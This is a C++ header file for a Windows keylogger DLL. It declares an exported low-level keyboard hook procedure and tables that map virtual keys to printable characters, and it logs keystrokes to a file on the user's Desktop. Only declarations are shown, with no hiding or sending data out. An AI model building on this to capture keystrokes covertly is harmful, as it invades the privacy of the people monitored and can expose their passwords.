#pragma once
#include <Windows.h>
#include <iostream>
#include <map>

using namespace std;

#ifdef KEYLOGGERPROCIMP_EXPORTS
#define KEYLOGGERPROC_API __declspec(dllexport)
#else
#define KEYLOGGERPROC_API __declspec(dllimport)
#endif

#define BUFSIZE 1024

// keys can affect meaning of typing
static map<int, char const*>  vkeyToChars = {
    {VK_BACK, "BACKSPACE"},
    {VK_TAB, "TAB"},
    {VK_RETURN, "ENTER"},
    {VK_DELETE, "DEL"},
};

// convert key which is a combination of Shift + otherKey
// see common layouts in https://en.wikipedia.org/wiki/Computer_keyboard#Alphabetic
static map<int, char const*>  shiftKeyToChars = {
    {VK_OEM_3, "~"},
    {0x31, "!"},
    {0x32, "@"},
    {0x33, "#"},
    {0x34, "$"},
    {0x35, "%"},
    {0x36, "^"},
    {0x37, "&"},
    {0x38, "*"},
    {0x39, "("},
    {0x30, ")"},
    {0x30, ")"},
    {VK_OEM_MINUS, "_"},
    {VK_OEM_PLUS, "+"},
    {VK_OEM_4, "{"},
    {VK_OEM_6, "}"},
    {VK_OEM_5, "|"},
    {VK_OEM_1, ":"},
    {VK_OEM_7, "\""},
    {VK_OEM_COMMA, "<"},
    {VK_OEM_PERIOD, ">"},
    {VK_OEM_2, "?"},
};

static INT64 sessionInterval = 2000;    // each typing session duration is 2 seconds
static PSYSTEMTIME lastSessionAt = NULL;
static wchar_t logPath[BUFSIZE] = {};   // %USERPROFILE%\Desktop\keylogger.txt


// keyboard event hook procedure
extern "C" KEYLOGGERPROC_API LRESULT CALLBACK keyloggerProc(
    int    code,
    WPARAM wParam,
    LPARAM lParam
);